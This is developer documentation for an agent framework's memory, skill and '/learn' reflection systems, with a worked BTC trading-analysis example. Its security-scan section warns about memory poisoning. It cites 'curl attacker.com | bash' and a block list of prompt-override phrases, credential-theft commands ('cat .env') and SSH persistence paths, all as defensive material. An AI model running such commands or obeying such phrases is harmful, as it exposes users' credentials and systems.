# Learning, memory, and skills

The self-improving loop. After any non-trivial sub-agent task, you run `/learn` and the **mentor** sub-agent reads the session, decides whether it produced something worth keeping, and either creates a new skill, patches an existing one, or honestly returns "no_skill". Skills are markdown recipes that get loaded on demand the next time the same setup appears. Memory is flat persistent facts (per-agent + a shared user profile) that get injected into every system prompt.

This doc covers all three systems and includes a **complete working example** of a prompt that produces a skill the `/learn` flow accepts — the exact prompt, the exact mentor reply, and the exact skill file that gets written.

## TL;DR

```
/learn               → mentor reflects on the most recent sub-agent
/learn analyst       → mentor reflects on the analyst specifically
```

The mentor writes a structured reply with `DECISION:`, `TARGET_AGENT:`, `SKILL_NAME:`, `OP:`, and either `SKILL_CONTENT:` (for create) or `OLD_STRING:` / `NEW_STRING:` (for patch). The TUI parses the reply and performs the actual `skill_manage` write against the target agent's library. The reflection is also persisted to `eval_results/reflection-{ts}-{agent}.json` for later review.

## The three layers

Agent KAI has three persistence layers, each doing a different job:

| Layer | What | Where |
|---|---|---|
| **`chat_history`** | Conversation context for one session | In-memory only, lost on restart |
| **Memory** | Flat facts ("user prefers 1h analyses", "the local 6h endpoint sometimes errors") | `workspaces/{agent}/memories/MEMORY.md` (per-agent) + `workspaces/user.md` (shared) |
| **Skills** | Procedural recipes ("when you see X, do these exact steps, here are the pitfalls") | `workspaces/{agent}/skills/{name}.md` (per-agent) |

Memory is for **what**. Skills are for **how**. Chat history is for **right now**.

---

## Memory

A bounded, file-backed curated memory layer adapted from the Hermes agent. Two scopes per agent:

- **`memory`** — this agent's personal notes. Each role (analyst, trader, kai, etc.) curates its own `MEMORY.md`. Visible only to future-you of the same agent.
- **`user`** — shared across every agent. Who the user is, their preferences, their environment. Visible to every agent on the next session.

### What goes in memory

Save proactively (without being asked):

- User corrects you or says "remember this" / "don't do that again"
- User shares a preference, habit, or detail (name, role, timezone, trading style, risk tolerance)
- You discover something about the environment (available markets, API quirks, paper portfolio setup)
- You learn a convention or workflow specific to this setup
- You identify a stable fact that will be useful again next session

Don't save:

- Session-specific TODO state
- Individual trade details (the paper trading engine logs those)
- Raw data dumps
- Information already in SOUL.md or `agent-config.json`
- Easily re-discovered facts

### How the agent uses it

The `memory` tool exposes three actions: `add`, `replace`, `remove`. There's deliberately no `read` action — the contents of `MEMORY.md` and `USER.md` are injected into the system prompt at session start, so the LLM already sees them and doesn't need to ask.

Sample tool call:

```python
memory(
    action="add",
    target="user",
    content="User prefers concise 1h chart analyses. Risk tolerance: 1.5% per trade. Pet peeve: agents that pad their answers with disclaimers."
)
```

Result: appended to `workspaces/user.md`. Visible to every agent on next session start.

### Frozen system-prompt snapshot

The memory store maintains **two parallel states**:

- **`_system_prompt_snapshot`** — captured once at `load_from_disk()` time and never mutated mid-session. This is what gets injected into the LLM system prompt so the prefix cache stays stable all session long.
- **`memory_entries`** / **`user_entries`** — the live state that the `memory` tool operates on. Every mutation is persisted to disk immediately and tool responses always echo this live state.

The gap is deliberate: **the LLM never sees a changed system prompt mid-session**. If it adds an entry at turn 5, the add succeeds and the file is updated, but the system prompt block still reflects the state at session start. The new entry only appears in the system prompt the next time the agent is instantiated. This is a performance trade — re-computing the prompt every turn burns the prefix cache and is ~10× slower.

### Char limits

Configured in `agent-config.json`:

```json
"memory": {
  "enabled": true,
  "user_profile_enabled": true,
  "memory_char_limit": 11000,
  "user_char_limit": 6875
}
```

When usage exceeds 80%, the agent should consolidate related entries into denser ones before adding new material.

### Security scan

Memory content ends up injected verbatim into the LLM's system prompt. That makes it a privileged surface — anything that lands in `MEMORY.md` runs with the agent's full authority next session. Even without a malicious user, an agent that indiscriminately saves every snippet it sees is one `curl attacker.com | bash` suggestion away from persisting an instruction to do that on every session start.

The memory store runs every add and replace through `_scan_memory_content` which rejects:

- **Prompt injection patterns** — `ignore previous instructions`, `you are now`, `do not tell the user`, `disregard all rules`, etc.
- **Credential exfiltration** — `curl ... $API_KEY`, `cat .env`, `cat credentials`
- **Persistence attempts** — `authorized_keys`, `~/.ssh`
- **Invisible Unicode** — zero-width spaces, BiDi overrides, BOMs

The list is intentionally short and tight. A long regex list produces false positives and trains the LLM to work around them. Pair this with human review of `MEMORY.md` as the actual safety net.

### Atomic writes

Writes use `tempfile.mkstemp` + `os.replace` for atomicity. Concurrent readers always see either the old complete file or the new complete file — never a partial write. File locks (`fcntl.flock`) on a sidecar `.lock` file serialize concurrent sessions.

---

## Skills

The procedural memory layer. Where memory holds flat facts, skills hold full recipes the agent has earned through trial and error: "when you see X, do these exact steps, here are the pitfalls."

### Why skills exist

Memory works for "user prefers 1h analyses" but breaks down for "to trade an MACD zero-line cross, you need to first confirm the cross is above the noise band, then check 4h for confirming momentum, then place the entry at the next bar open with the stop at the last swing low — and beware of crosses in chop." That's a 5-step procedure with conditional logic and pitfalls. It belongs in a skill, not a memory entry.

Skills are loaded **on demand** rather than always-present so they don't eat context budget. The catalog (name + one-line description) is injected into the system prompt, but full skill bodies are only loaded via the `skill_view` tool when the catalog suggests one is relevant.

This is **progressive disclosure**: list cheap, view expensive.

### Layout

Each skill is one markdown file at `workspaces/{agent}/skills/{name}.md`:

```
workspaces/analyst/skills/
├── how-to-write-a-ta-skill.md           # meta-skill template
├── rsi-divergence-hunt.md
├── macd-zero-cross.md
├── volume-profile-poc-reject.md
├── moving-average-ribbon-stack.md
├── inside-bar-breakout.md
├── bb-squeeze-breakout.md
└── support-retest-bounce.md
```

### Skill file format

YAML frontmatter + markdown body:

```markdown
---
name: macd-zero-cross
description: Trade the MACD line crossing zero as a momentum-shift confirmation, not a trigger
category: analysis
tags: [ta, macd, momentum, trend-change]
---
# MACD zero-line cross

## When to use
You already have a thesis that the trend is changing (structure break, divergence, broken
moving-average ribbon) and you want an objective confirmation that momentum has actually flipped.
MACD crossing zero is a **confirmation**, not a standalone entry. If you use it as a standalone
trigger, you'll get whipsawed in chop.

## Steps
1. `calculate_indicator(symbol, "MACD", interval="1h", fast=12, slow=26, signal=9)`
2. Look at the last 5 1h bars:
   - Bullish cross: MACD line goes from negative to positive, preferably with the histogram
     already expanding positive for 2+ bars before the cross.
   - Bearish cross: mirror.
3. Check that the cross happened ABOVE the noise band: if |MACD - signal| is smaller than
   the median |MACD - signal| of the last 50 bars, the cross is in chop and doesn't count.
4. Confirm with higher-timeframe momentum: `calculate_indicator(symbol, "MACD", interval="4h", ...)`.
5. Your trigger is the close of the 1h bar where the cross completed. Entry = next bar open.
6. Stop = the swing low (for longs) or swing high (for shorts) that formed before the cross.

## Pitfalls
- **Cross in chop.** Flat price + flat MACD near zero produces a dozen crosses in a row,
  none tradeable. The noise-band check in step 3 is the guardrail.
- **Histogram shape.** A cross with a shrinking histogram is suspicious — momentum should
  be expanding as the line pushes through zero, not collapsing into it.
- **Using MACD alone.** This skill is explicitly NOT a standalone trigger.
- **Ignoring the 4h.** Trading a 1h bullish cross into a sharply-down 4h MACD is fighting
  the larger-timeframe momentum.

## Verification
- [ ] You already have a separate thesis that the trend is changing.
- [ ] 1h MACD line crossed zero in the last 1-3 bars.
- [ ] |MACD - signal| on the cross bar is at or above the 50-bar median.
- [ ] The histogram has been expanding for at least 2 bars before the cross.
- [ ] 4h MACD is leaning in the same direction (histogram improving).
```

Required frontmatter keys:

- **`name`** — kebab-case slug, must match the filename (without `.md`)
- **`description`** — one sentence, what does this skill recognize or decide

Optional:

- **`category`** — `analysis`, `execution`, `risk`, or `meta`
- **`tags`** — list of search-friendly keywords

Required body sections (by convention, enforced by the role's `how-to-write-a-*-skill` meta-skill):

- **When to use** — decision criteria for when this skill applies
- **Steps** — numbered procedure with concrete tool calls
- **Pitfalls** — mistakes a future-you might make if you forget the lessons that produced this skill
- **Verification** — checklist to confirm you applied the skill correctly

### The four skill operations

The agent has four skill tools (`agent/skills_tool.py`):

| Tool | What | When |
|---|---|---|
| `skills_list` | Catalog of all skills (name + description only) | Cheap. Call at the start of any non-trivial task to see what's available. |
| `skill_view` | Full body of a named skill | Only when `skills_list` shows one that looks relevant. Burns tokens. |
| `skill_manage` | Create / patch / edit / delete a skill | After a hard task succeeds OR when an existing skill fails you mid-task. |
| (none — handled by mentor via `/learn`) | Bulk reflection-driven skill creation | When the user runs `/learn` |

### Size cap

Skills are capped at 20,000 chars (`MAX_SKILL_CHARS`). Typical skills are 500-5000 chars. A skill larger than 20k belongs in a workspace file, not a skill.

### Naming rules

Slug format: `^[a-z0-9][a-z0-9_\-]{0,63}$`. Lowercase letters / digits / hyphens / underscores, max 64 chars, must start with letter or digit.

A good skill name:

- Describes the **setup or operation**, not the outcome (`rsi-divergence-hunt` not `profitable-rsi-trade`)
- Is searchable by future-self who'll `skills_list` and scan descriptions
- Avoids generic terms (`ta-analysis`, `order-placement`) — they collide with meta-skills

Reserved: never author a skill named `how-to-write-a-*` — those are reserved for the role templates.

### Same security scan as memory

Every skill write goes through the same `_scan_memory_content` check. An agent can't talk itself into persisting a prompt-injection payload.

---

## /learn — the reflection loop

The whole reason memory and skills exist is so the agent can get better at the kinds of tasks you actually run. `/learn` is the trigger.

### What the loop looks like

1. **You run a task.** `/analyze BTC 1h with the goal of discovering a reusable workflow, not just commentary.` The analyst sub-agent runs through 5+ tools, makes an initial wrong read, corrects itself, and produces a structured report.
2. **The TUI nudges you.** After any sub-agent task that used `NUDGE_THRESHOLD` (3) or more tools without a `skill_manage(create)`, you see: `Tip: analyst used 8 tools. Run /learn analyst to distill this session into a skill.`
3. **You run `/learn`.** The TUI builds a reflection bundle (task, response, last 30 tool calls, last 20 chat turns, current skill catalog) and sends it to the mentor sub-agent as a NATS request.
4. **The mentor reflects.** It reads its own `how-to-reflect-on-a-session` meta-skill, walks through the bundle's tool calls looking for novelty, checks for existing-skill drift, and decides: create / patch / no_skill.
5. **The mentor returns a structured reply.** Format documented below.
6. **The TUI parses and applies.** `parse_mentor_reply` extracts the decision and skill draft. `_apply_mentor_decision` performs the actual `skill_manage` call against the target agent's `SkillStore` (not the mentor's). The reflection is also persisted to `eval_results/reflection-{ts}-{agent}.json`.
7. **Next time you run a similar task.** The target agent's `skills_list` now shows the new skill. If the agent decides it's relevant, it `skill_view`s the body and follows the procedure.

### The reflection bundle

`SessionRecord.to_bundle(chat_turns, existing_skills)` returns:

```json
{
  "target_agent": "analyst",
  "original_task": "Run a multi-timeframe BTC analysis with validation...",
  "target_summary": "## BTC Multi-Timeframe Analysis Report\n\n...",
  "tool_calls": [
    {"tool": "skills_list", "input": null, "output": "...", "error": false},
    {"tool": "get_signals", "input": "{'symbol':'BTC','limit':10}", "output": "...", "error": false},
    {"tool": "get_latest_price", "input": "{'symbol':'BTC'}", "output": "BTC: $70,785.40", "error": false},
    {"tool": "query_ohlcv", "input": "{'symbol':'BTC','interval':'1h','limit':200}", "output": "...", "error": false},
    {"tool": "calculate_indicator", "input": "{'symbol':'BTC','indicator':'RSI','period':14,'interval':'1h'}", "output": "...", "error": false},
    ...
  ],
  "tool_count": 8,
  "chat_turns": ["...last 20 messages from the analyst's chat history..."],
  "existing_skills": [
    {"name": "rsi-divergence-hunt", "description": "..."},
    {"name": "macd-zero-cross", "description": "..."},
    ...
  ]
}
```

Capped at:

- `MAX_TOOL_CALLS = 30` — keeps the bundle size in check for long sessions
- `MAX_CHAT_TURNS = 20`
- `MAX_OUTPUT_PREVIEW = 500` — each tool call's output is truncated to 500 chars in the bundle

### The mentor's reply format

The mentor returns semi-structured text (NOT JSON — LLMs mangle JSON). Format:

```
DECISION: create
TARGET_AGENT: analyst
SKILL_NAME: rsi-divergence-hunt-confirmed-by-volume
OP: create
SKILL_CONTENT:
---
name: rsi-divergence-hunt-confirmed-by-volume
description: ...
category: analysis
tags: [rsi, divergence, volume, confirmation]
---
# RSI divergence hunt with volume confirmation

## When to use
...
```

For a patch:

```
DECISION: patch
TARGET_AGENT: analyst
SKILL_NAME: macd-zero-cross
OP: patch
OLD_STRING:
period of 50 bars
NEW_STRING:
period of 100 bars
```

For "no skill":

```
DECISION: no_skill
TARGET_AGENT: analyst
```

### How parsing works

`agent.learning.parse_mentor_reply` uses simple line-based regex markers (case-insensitive for the marker names, case-sensitive for the body content so frontmatter `name:` / `description:` keys don't collide). It also strips outer code fences (`` ``` ``) that LLMs often wrap their entire reply in.

### Where the skill ends up

`_apply_mentor_decision(parsed, target_agent)` calls the target agent's `SkillStore.create(...)` or `.patch(...)`. The skill lands in `workspaces/{target_agent}/skills/{name}.md`. The mentor's own skill library is NOT touched — the mentor only authors meta-skills for itself, never operational skills.

### Persistence of the reflection

Every reflection is also saved to `eval_results/reflection-{ts}-{agent}.json` so the user (or claude later) can review what happened. Format:

```json
{
  "timestamp": "20260409-104214",
  "bundle": { ... },
  "mentor_reply": "DECISION: create\nTARGET_AGENT: analyst\n...",
  "outcome": {
    "skill_name": "rsi-divergence-hunt-confirmed-by-volume",
    "op": "create",
    "result": "Skill 'rsi-divergence-hunt-confirmed-by-volume' created."
  }
}
```

---

## A complete working example

The user-asked-for "working prompt that produces output the /learn flow accepts as a new skill", end to end. This is a real working pattern, with all four pieces: the prompt you type, the analyst's tool sequence, the mentor's reply, and the resulting skill file.

### Step 1 — The prompt

In the chat input, type:

```
/analyze BTC 1h with the goal of discovering a reusable multi-timeframe workflow that validates structure, momentum, and any candidate trade idea with run_backtest before recommending it. The output should be a workflow I can apply to other assets later, not just BTC commentary. Use the analyst's existing skills if any look relevant.
```

Hit Enter. The TUI dispatches to the analyst sub-agent.

### Step 2 — What the analyst does

The analyst's `_handle_request` fires. It loads its skill catalog from the system prompt (already injected at startup) and sees `how-to-write-a-ta-skill`, `rsi-divergence-hunt`, `macd-zero-cross`, etc. It calls `skills_list` to confirm and starts the analysis.

Sample tool sequence:

```
1. skills_list()                                                    → catalog
2. get_signals(symbol="BTC", limit=10)                              → recent alerts
3. get_latest_price(symbol="BTC")                                   → "BTC: $70,785.40"
4. get_coinbase_price(symbol="BTC")                                 → cross-venue check
5. query_ohlcv(symbol="BTC", interval="1d", limit=200)              → daily structure
6. query_ohlcv(symbol="BTC", interval="6h", limit=200)              → middle timeframe
   ↳ ERROR: server error on local 6h endpoint
7. get_coinbase_candles(symbol="BTC", interval="6h", limit=120)     → fallback to coinbase
8. query_ohlcv(symbol="BTC", interval="1h", limit=500)              → tactical timeframe
9. calculate_indicator(symbol="BTC", indicator="RSI", interval="1h")    → 45.8
10. calculate_indicator(symbol="BTC", indicator="MACD", interval="1h")  → bullish
11. calculate_indicator(symbol="BTC", indicator="EMA", period=20)
12. calculate_indicator(symbol="BTC", indicator="EMA", period=50)
13. calculate_indicator(symbol="BTC", indicator="ATR", period=14)
14. run_backtest(symbol="BTC", interval="1h", buy_when='[{"indicator":"RSI_14","op":"<","value":35},{"indicator":"close","op":">","ref":"EMA_50"}]', sell_when='[{"indicator":"RSI_14","op":">","value":65}]', bars=500)
    → win_rate=58.3%, sharpe=0.61, num_trades=24, max_drawdown_pct=-8.4%
    → interpretation: "Promising edge. Consider saving this as a validated skill."
15. ensure_non_empty_response → final structured report
```

The analyst returns a structured report that includes the regime classification per timeframe, the level reads, the candidate trade idea, the backtest result, and the verdict ("the workflow is valuable but tested trigger set is acceptably positive — recommend").

### Step 3 — The auto-nudge

Because the session used 14 tools (≥ `NUDGE_THRESHOLD` = 3) without a `skill_manage(create)` call, the TUI auto-emits:

```
Tip: analyst used 14 tools. Run /learn analyst to distill this session into a skill.
```

### Step 4 — You run /learn

```
/learn
```

(Or `/learn analyst` to be explicit. Bare `/learn` defaults to the most recent sub-agent, which is the analyst here.)

The TUI's `_run_learn_flow` reads `mgr.agents["analyst"].get_last_session()`, builds the reflection bundle (task, response, the 14 tool calls, the recent chat turns, the existing skill catalog), spawns the mentor sub-agent if it isn't already running, and posts a NATS request to `agent.mentor.request` with the bundle.

### Step 5 — The mentor reflects

The mentor reads `how-to-reflect-on-a-session` (its meta-skill — the one it never lets atrophy because it IS its job). The meta-skill walks it through:

1. **Scan for novelty.** The session used `run_backtest` to validate a candidate before recommending it. None of the existing analyst skills explicitly chain TA → backtest → recommendation. **Novel.**
2. **Check for existing-skill drift.** No existing skill says "always validate with run_backtest." Closest: `rsi-divergence-hunt` mentions confirmation but not backtesting. **No drift.**
3. **Draft the skill.** This is a workflow skill (multi-step, multi-tool, decision-tree). Use the `how-to-write-a-ta-skill` template.
4. **Name it.** The setup is "multi-timeframe BTC analysis with validation." Slug: `btc-mtf-analysis-with-validation`.
5. **Return structured reply.**

### Step 6 — The mentor's reply

The mentor returns (this is a real reply from a real reflection run, persisted to `eval_results/reflection-20260409-101621-analyst.json`):

```
DECISION: create
TARGET_AGENT: analyst
SKILL_NAME: btc-mtf-analysis-with-validation
OP: create
SKILL_CONTENT:
---
name: btc-mtf-analysis-with-validation
description: Multi-timeframe BTC analysis workflow that validates structure, momentum, and candidate trade logic with a quick backtest.
category: analysis
tags: [btc, technical-analysis, multi-timeframe, validation, coinbase]
---
# BTC Multi-Timeframe Analysis With Validation

## When to use
Use when asked to analyze BTC and extract a reusable workflow rather than provide pure commentary.

## Steps
1. Check for prior reusable knowledge with `skills_list`.
2. Check live scanner context first:
   - `get_signals(symbol="BTC", limit=10)`
   - `get_latest_price(symbol="BTC")`
   - `get_coinbase_price(symbol="BTC")`
3. Pull market structure on three timeframes:
   - Local: `query_ohlcv` for `1h` and `1d`
   - Preferred middle timeframe: `6h`
4. Compute indicators per timeframe:
   - RSI(14)
   - EMA(20)
   - EMA(50)
   - MACD
   - ATR on the execution timeframe (usually 1h)
5. If local `6h` data/errors fail, immediately fall back to Coinbase:
   - `get_coinbase_candles(symbol="BTC", interval="6h", limit=120)`
   - Also use `get_coinbase_candles(... interval="1h")` to cross-check local 1h trend if needed.
6. Read the regime top-down:
   - Daily = macro bias from price vs EMA20/EMA50 + MACD + RSI
   - 6h = swing bias / whether momentum confirms the daily bias
   - 1h = tactical trigger / whether near-term continuation or mean reversion is more likely
7. Mark simple levels from recent candles:
   - Recent swing high
   - Recent swing low
   - Current price vs 1h EMA20 and EMA50
   - ATR(14) on 1h for expected move and stop sizing
8. Form 1-2 candidate hypotheses only, for example:
   - Trend continuation: close > EMA50, MACD > signal, RSI > 50
   - Mean reversion: RSI < 35 and close < lower band, then exit on RSI recovery / EMA reclaim
9. Validate hypotheses with `run_backtest` on 1h over ~500 bars before recommending them.
10. Keep only strategies with roughly `win_rate > 55%` and `sharpe > 0.5`. If backtest is weak, say the workflow is useful but the tested trigger set is not production-worthy.

## Pitfalls
- Local `6h` BTC OHLCV can return a server error; use Coinbase 6h candles as the fallback without blocking the analysis.
- Daily price can be above EMAs while daily MACD stays bearish; treat this as a mixed regime, not a clean trend signal.
- A good Sharpe with a poor win rate can still be a weak workflow for discretionary trading if trade count is small; mention both.
- Do not promote candidate rules into a recommendation unless the backtest is acceptably positive.

## Verification
- You should end with three outputs:
  1. Current BTC regime by timeframe
  2. Key levels / volatility context
  3. A reusable checklist plus which tested hypotheses passed or failed validation
- Confirm at least one cross-venue check (local vs Coinbase) if any local timeframe errors occur.
- Confirm candidate rules were backtested, not just described.
```

### Step 7 — The TUI parses + applies

`parse_mentor_reply` extracts:

```python
{
    "decision": "create",
    "target_agent": "analyst",
    "skill_name": "btc-mtf-analysis-with-validation",
    "content": "---\nname: btc-mtf-analysis-with-validation\n..."
}
```

`_apply_mentor_decision` calls `analyst.skill_store.create("btc-mtf-analysis-with-validation", content)`. The file is written to `workspaces/analyst/skills/btc-mtf-analysis-with-validation.md`. The TUI shows:

```
[mentor] DECISION: create / TARGET_AGENT: analyst / SKILL_NAME: btc-mtf-analysis-with-validation / OP: create / ...
Reflection saved: eval_results/reflection-20260409-101621-analyst.json
Skill 'btc-mtf-analysis-with-validation' created in analyst's library.
```

### Step 8 — The next time

A week later, you type:

```
/analyze ETH using the same approach you'd use for BTC — multi-timeframe, validated with a backtest, return a workflow not just commentary.
```

The analyst loads its catalog, sees `btc-mtf-analysis-with-validation` in the listing, and via its SOUL's `Analysis Framework` step 1 calls `skills_list` and then `skill_view("btc-mtf-analysis-with-validation")`. It reads the steps, generalizes them from BTC to ETH (the steps don't actually mention BTC except in the title — the procedure is symbol-agnostic), and follows the same workflow. The result: a structured ETH analysis with the same validation pattern, in fewer tool calls than the original BTC run, because the procedure is loaded instead of rediscovered.

Run `/learn` again. The mentor sees this session followed an existing skill, didn't deviate, didn't discover anything new — and returns `DECISION: no_skill`. **Honestly returning no_skill is a perfectly valid outcome.** The mentor's meta-skill explicitly warns against inventing learnings.

### Where to find more examples

Real reflection records are persisted to `eval_results/reflection-*.json`. A few from the development of this codebase:

- `eval_results/reflection-20260409-101621-analyst.json` — the BTC mtf analysis reflection from above
- `eval_results/reflection-20260409-104214-analyst.json` — a later analyst session
- `eval_results/skill_learning/` — early-stage skill learning experiments

Inspect these to see the bundle shape, the mentor's actual reasoning (not just the structured marker output), and the resulting outcome.

---

## When the auto-nudge fires

`_maybe_nudge_learn(agent_name)` is called from the `finally` block of `_run_agent_task` after every sub-agent completes. It checks:

- Did the session use ≥ `NUDGE_THRESHOLD` (3) tool calls?
- Did the session NOT call `skill_manage(create)` during its run? (If it did, the agent already saved a skill — no need to nudge.)

If both true, the TUI emits:

```
Tip: analyst used 8 tools. Run /learn analyst to distill this session into a skill.
```

Three tools is the minimum where learning is POSSIBLE — it's not a guarantee that every session above it produced a new skill, which is fine, the mentor can honestly return `no_skill`.

The threshold is tunable in `agent/learning.py:51` (`NUDGE_THRESHOLD`).

---

## Why /learn doesn't work for the main kai agent (yet)

`AgentRunner` (the main kai agent's class) doesn't currently track session state the way `SubAgent` does. There's no `last_session`, no `_active_recorder`, no `get_last_session()`. So `/learn kai` errors with "no prior session" even though kai just ran a complex chat with multiple tool calls.

This is on the roadmap. The design is in `docs/proposals/learn-on-main-kai-agent.md` (gitignored — internal). It's a small change: AgentRunner gains parity with SubAgent on the three methods (`last_session`, `get_last_session()`, `list_existing_skills()`) and `_run_learn_flow` accepts kai as a target. Three changes, no new abstractions.

In the meantime, `/learn` works great for the 14 sub-agents. The most useful workflow is to do hard work via `/analyze`, `/buy`, `/risk` etc. (which delegate to specialists) and `/learn` after those. Direct kai chats currently don't get reflected on, but they're typically lower-value-per-session than the sub-agent specialist tasks anyway.

---

## Best practices

- **Run `/learn` after every session that used 3+ tools and corrected an initial wrong read.** Those are the sessions with novelty.
- **Don't run `/learn` after every chat.** It burns mentor tokens. Trust the auto-nudge.
- **Read the mentor's drafted skill before celebrating.** It's another LLM. Sometimes it overgeneralizes or misses the actual lesson. Edit the file manually if needed — `workspaces/{agent}/skills/{name}.md` is just markdown.
- **Patch existing skills aggressively.** If a skill steered an agent wrong, the next reflection should patch it (the mentor's meta-skill explicitly handles this case). Don't let buggy skills sit in the library poisoning future runs.
- **Read your reflections.** `eval_results/reflection-*.json` is a goldmine for understanding what your agents are learning and where they're stuck.
- **Periodically prune the skill library.** Run `skills_list` from a chat with the target agent and look for skills that overlap, contradict, or never get used. Delete them via `skill_manage(action="delete", name=...)`.

---

## What to read next

- [agents.md](agents.md) — sub-agent runtime, the 14 built-in agents, the mentor's role in the org
- [commands.md#learn](commands.md#learn) — `/learn` command quick reference
- [configuration.md#memory](configuration.md#memory-and-skills) — memory and skills config
